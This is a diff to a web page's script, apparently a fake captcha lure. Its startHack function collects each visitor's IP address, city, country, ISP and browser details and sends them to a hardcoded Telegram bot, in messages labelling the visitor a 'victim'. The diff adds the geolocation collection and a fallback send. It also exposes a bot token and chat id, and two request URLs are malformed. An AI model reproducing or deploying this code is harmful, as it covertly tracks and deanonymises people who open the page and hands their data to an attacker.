@@ -42,30 +42,40 @@
     </div>
 
     <script>
-        async function startHack() {
-           
+                async function startHack() {
+         
             document.getElementById('captcha-box').style.display = 'none';
             document.getElementById('leak-box').style.display = 'block';
-            document.getElementById('user-os').innerText = navigator.platform;
 
             const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
             const chat_id = "-1003861311533";
 
-           
-            const initialMsg = encodeURIComponent(`🔥 ПЕРЕХОД!\n📱 Устройство: ${navigator.userAgent}\n💻 Платформа: ${navigator.platform}`);
-            fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${initialMsg}`);
-
-            try { 
+            try {
                 
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                document.getElementById('user-ip').innerText = data.ip;
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                
+             
+                document.getElementById('user-ip').innerText = d.ip;
+                document.getElementById('user-geo').innerText = `${d.city}, ${d.country_name}`;
+                document.getElementById('user-os').innerText = navigator.platform;
 
- 
-                const ipMsg = encodeURIComponent(`📍 IP ЖЕРТВЫ: ${data.ip}`);
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${ipMsg}`);
+             
+                const message = 
+                    `🔥 ЖЕРТВА КЛИКНУЛА!\n` +
+                    `📍 IP: ${d.ip}\n` +
+                    `🌍 Город: ${d.city}, ${d.country_name}\n` +
+                    `🏢 Провайдер: ${d.org}\n` +
+                    `📱 Устройство: ${navigator.userAgent}`;
+
+              
+                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
+                await fetch(url);
+
             } catch (e) {
-                document.getElementById('user-ip').innerText = "Ошибка сети";
+              
+                const backup = encodeURIComponent(`⚠️ Переход!\n📱 Устройство: ${navigator.userAgent}`);
+                fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${backup}`);
             }
         }
     </script>
